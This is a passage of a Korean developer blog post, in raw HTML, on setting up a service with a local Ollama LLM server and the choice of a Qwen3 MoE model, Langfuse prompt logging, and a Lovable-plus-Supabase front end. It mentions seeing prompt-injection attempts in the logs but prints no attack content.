class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-&#xC11C;&#xBC84;"><a href="#2-Ollama-&#xC11C;&#xBC84;" class="headerlink" title="2. Ollama &#xC11C;&#xBC84;"></a>2. Ollama &#xC11C;&#xBC84;</h1><p>&#xBA3C;&#xC800; &#xC65C; &#xC0C1;&#xC6A9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC4F0;&#xC9C0; &#xC54A;&#xB0D0;?&#xB294; &#xC9C8;&#xBB38;&#xC774; &#xB4DC;&#xC2E4;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. Gemini, ChatGPT &#xB4F1; &#xC88B;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740;&#xB370; &#xB9D0;&#xC774;&#xC8E0;. &#xC77C;&#xB2E8; &#xAC1C;&#xC778;&#xC801;&#xC778; &#xC0DD;&#xAC01;&#xC740; &#x201C;&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xB294; &#xC791;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#x201D; &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC3D;&#xC5C5; &#xC804; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB3C4; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xACE0;, &#xD604;&#xC7AC; &#xC5F0;&#xAD6C;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC131;&#xB2A5;&#xC758; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;&#xC694; &#x3160;&#x3160;</p><p>&#xD604;&#xC7AC; &#xC81C;&#xAC00; &#xC9D1;&#xC5D0;&#xC11C; LLM &#xCD94;&#xB860;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB294; &#xB9E5;&#xBBF8;&#xB2C8; &#xC785;&#xB2C8;&#xB2E4;. M4 Pro &#xCE69;&#xC744; &#xD0D1;&#xC7AC;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xB7A8;&#xC740; 64&#xAE30;&#xAC00; &#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0; Ollama &#xC11C;&#xBC84;&#xB97C; &#xC62C;&#xB9AC;&#xACE0; &#xBAA8;&#xB378;&#xC744; &#xC11C;&#xBE59;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://ollama.com/search">Ollama &#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xAC00;&#xBCF4;&#xC2DC;&#xBA74; &#xB7A8; 64&#xAE30;&#xAC00; &#xB0B4;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; gpt-oss, deepseek &#xB4F1; &#xBAA8;&#xB378; &#xC911;&#xC5D0;&#xC11C; &#xC800;&#xB294; 32B &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xC758; &#xBAA8;&#xB378;&#xB4E4; &#xC911; q8&#xB85C; &#xC591;&#xC790;&#xD654;&#xB41C; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xC88B;&#xC544;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xB4E4;&#xC5B4;&#xBCF4;&#xC790;&#xBA74;:</p><ul><li>70B q4 &#xBAA8;&#xB378;&#xB4E4;(&#xB2E4;&#xC6B4;&#xBC1B;&#xC73C;&#xBA74; &#xC57D; 40G &#xC815;&#xB3C4;)&#xC744; &#xB7A8; 64&#xAE30;&#xAC00;&#xC5D0;&#xC11C; &#xB3CC;&#xB9B4; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xB2F9;&#xC2DC; 70B &#xBAA8;&#xB378;&#xB4E4;&#xC740; &#xB098;&#xC628;&#xC9C0; &#xC870;&#xAE08; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB09C; &#xBAA8;&#xB378;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAE34; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xC704;&#xD55C; &#xACF5;&#xAC04;&#xB3C4; &#xB0A8;&#xACA8;&#xB46C;&#xC57C;&#xD55C;&#xB2E4; &#xC0DD;&#xAC01;&#xD574;&#xC11C; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC4F0;&#xBA74; &#xC88B;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>8&#xC6D4; &#xC911;&#xC21C;&#xCBE4;&#xC5D0; &#xB098;&#xC628; &#xD56B;&#xD55C; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xACE0; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. gpt-oss&#xC758; &#xACBD;&#xC6B0; 20B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xACE0;, qwen3&#xC5D0;&#xB294; 32B&#xACFC; 30B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xC8E0;. &#xC774; &#xBAA8;&#xB378;&#xB4E4; &#xACBD;&#xC6B0;, &#xCCB4;&#xAC10;&#xC0C1; &#xCD5C;&#xC2E0; ChatGPT 4o &#xC815;&#xB3C4; &#xD639;&#xC740; &#xADF8;&#xBCF4;&#xB2E4; &#xC0B4;&#xC9DD; &#xB354; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xB0B4;&#xB294; &#xB4EF; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC778; phi4 14B, gemma 27B &#xB4F1;&#xC744; &#xC81C;&#xAC00; &#xBBF8;&#xB9AC; &#xC138;&#xD305;&#xD574;&#xB454; &#xBA87; &#xAC1C;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xBA74;&#xC11C; &#xC131;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC5EC;&#xB7EC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xAC70;&#xCE5C; &#xACB0;&#xACFC; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p>&#xB2F9;&#xC5F0;&#xD55C;&#xAC70;&#xC9C0;&#xB9CC; MoE &#xBAA8;&#xB378;&#xC774; &#xC77C;&#xBC18; &#xBAA8;&#xB378;&#xBCF4;&#xB2E4; &#xCD94;&#xB860;&#xC18D;&#xB3C4;&#xAC00; &#xD6E8;&#xC52C; &#xBE60;&#xB985;&#xB2C8;&#xB2E4;. Qwen3 32B q8 &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, 7 tps &#xC815;&#xB3C4;&#xC758; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC654;&#xACE0; Qwen 30B MoE &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0; &#xB192;&#xC73C;&#xBA74; 45 tps&#xAE4C;&#xC9C0; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC18C;&#xADDC;&#xBAA8; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>Reasoning &#xBAA8;&#xB378;&#xC778; qwen3:30b-a3b-thinking-2507&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD14C;&#xC2A4;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Reasoning&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC; &#xBAA8;&#xB378;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC9C0; &#xC5BC;&#xB9C8; &#xC548;&#xB41C; &#xBAA8;&#xB378;&#xC774;&#xB77C; &#xADF8;&#xB7EC;&#xB824;&#xB2C8; &#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xC548; &#xC37C;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li>&#xB2E4;&#xB978; Reasoning &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xCD9C;&#xB825;&#xC774; &#xC644;&#xB8CC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xAC78;&#xB9B0;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. instruct &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC5B4;&#xC9C0;&#xAC04;&#xD55C; &#xCD9C;&#xB825;&#xAE4C;&#xC9C0;&#xB294; 2&#xBD84; &#xC548;&#xC5D0; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC9C0;&#xB9CC; reasoning&#xC744; &#xD558;&#xB294; &#xC21C;&#xAC04; 1~2&#xBD84;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; reasoning&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC131;&#xB2A5;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694;.</li><li>&#xC774;&#xBCF4;&#xB2E4; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD55C;&#xBC88;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC131;&#xB2A5;&#xC774; &#xB5A8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. phi4 14B &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, &#xC131;&#xB2A5;&#xC740; &#xCDA9;&#xBD84;&#xD588;&#xC9C0;&#xB9CC; fp16 &#xBAA8;&#xB378;&#xC744; &#xC368;&#xC57C; &#xC131;&#xB2A5;&#xC774; &#xC4F8;&#xB9CC;&#xD55C; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xB098;&#xC654;&#xB294;&#xB370;, reasoning &#xC2DC;&#xAC04;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4; &#xC2E4;&#xC0AC;&#xC6A9;&#xC5D0;&#xB294; &#xBB34;&#xB9AC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC678; Qwen3 14B, 8B, Gemma 27B, Deepseek 14B &#xB4F1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xACF5;&#xC218;&#xAC00; &#xB354; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; &#xACE0;&#xB824;&#xC0AC;&#xD56D; &#xC911;&#xC5D0; &#xC18D;&#xB3C4;, &#xC131;&#xB2A5;, &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;&#xC744; &#xACE0;&#xB824;&#xD588;&#xC744; &#xB54C; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC81C;&#xC77C; &#xC801;&#xD569;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBAA8;&#xB378;&#xC744; &#xC815;&#xD588;&#xC73C;&#xB2C8; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC138;&#xD305;&#xD558;&#xACE0; <code>ollama serve</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xB9CC;&#xD558;&#xBA74; &#xC900;&#xBE44; &#xB05D;!&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;"><a href="#2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;" class="headerlink" title="2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;"></a>2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;</h1><p>&#xC774;&#xAC83;&#xB3C4; &#xC5ED;&#xC2DC; &#x201C;LangSmith &#xC4F0;&#xBA74; &#xB418;&#xB294;&#xAC70; &#xC544;&#xB0D0;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2E4;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC5ED;&#xC2DC; &#xC194;&#xB8E8;&#xC158; &#xAC1C;&#xBC1C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD24;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xCC38;&#xC5D0; Langfuse&#xB97C; &#xC368;&#xBCF4;&#xC790;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Langfuse&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB798;&#xD3EC;&#xC5D0;&#xC11C; &#xBC1B;&#xC544; &#xBC14;&#xB85C; &#xB3C4;&#xCEE4;&#xB85C; &#xC62C;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, langchain&#xC5D0; langfuse&#xC758; callbackhandler&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC758; &#xB85C;&#xAE45;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>&#xB85C;&#xAE45;&#xC744; &#xD558;&#xBA74; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xC804;&#xC1A1;&#xC774; &#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xC751;&#xB2F5;&#xC758; &#xD004;&#xB9AC;&#xD2F0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB098; &#xC2E4;&#xD589; &#xCCB4;&#xC778;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;.</p><p>&#xADF8;&#xB9AC;&#xACE0;! &#xACF5;&#xACA9;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xC778;&#xC81D;&#xC158; &#xACF5;&#xACA9;&#xC774; &#xB0A0;&#xB77C;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xBCBD;&#xAE4C;&#xC9C0; &#xC5F4;&#xC2EC;&#xD788; &#xD558;&#xC168;&#xB294;&#xB370;&#x2026; &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC6D0;&#xD558;&#xC2DC;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xAC00;&#xC838;&#xAC00;&#xC9C0; &#xBABB;&#xD558;&#xC2E0; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>&#xC6D0;&#xB798; &#xC800;&#xD76C; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xB294; Base44&#xB85C; &#xAC1C;&#xBC1C;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB124;, &#xBA87; &#xB2EC; &#xC804;&#xC5D0; <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">$80M&#xC5D0; Wix&#xC5D0; &#xC778;&#xC218;&#xB41C; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xC774; &#xAE30;&#xC0AC;&#xB97C; &#xBCF4;&#xACE0; &#xC368;&#xBD24;&#xB294;&#xB370;&#xC694;, &#xAC04;&#xB2E8;&#xD55C; &#xB79C;&#xB529;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0;&#xB294; &#xAD1C;&#xCC2E;&#xC558;&#xB294;&#xB370;, &#xB85C;&#xADF8;&#xC778; &#xAE30;&#xB2A5; &#xC774;&#xD6C4;&#xB85C; &#xBB38;&#xC81C;&#xAC00; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xAC1C;&#xBC1C;&#xD560; &#xB54C;&#xB294; &#xC815;&#xB9D0; &#xCD5C;&#xC545;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC2DC; &#xBB58; &#xC4F8;&#xAE4C; &#xCC3E;&#xC544;&#xBCF4;&#xB358; &#xC911; &#x201C;Lovable&#xC774;&#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC694;&#xC998; &#xD56B;&#xD558;&#xB2E4;&#xB354;&#xB77C;&#x201D;&#xB294; &#xC598;&#xAE30;&#xB97C; &#xB4E3;&#xACE0; &#xC77C;&#xB2E8; &#xC368;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB611;&#xAC19;&#xC774; &#xBA3C;&#xC800; &#xBC30;&#xAEF4;&#xC628; &#xB4A4; &#xB85C;&#xADF8;&#xC778;&#xBD80;&#xD130; &#xAC1C;&#xBC1C;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; Supabase&#xB97C; &#xC5F0;&#xACB0;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Base44&#xC640; &#xB2EC;&#xB9AC; Supabase&#xB791; &#xBC14;&#xB85C; &#xC5F0;&#xB3D9;&#xB3C4; &#xB418;&#xACE0;, &#xB514;&#xBE44; &#xAD00;&#xB9AC;&#xD558;&#xAE30;&#xB3C4; &#xD3B8;&#xD558;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xB300;&#xADDC;&#xBAA8; &#xACE0;&#xAC1D;&#xC744; &#xAC10;&#xB2F9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD798;&#xB4E4;&#xAE34;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;&#xC694;(&#xC81C; &#xC9C0;&#xAC11;&#xC774;) &#xC774;&#xB807;&#xAC8C; &#xC5F0;&#xB3D9;&#xC744; &#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB9CC;&#xB4E4;&#xBA74;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/06.png" 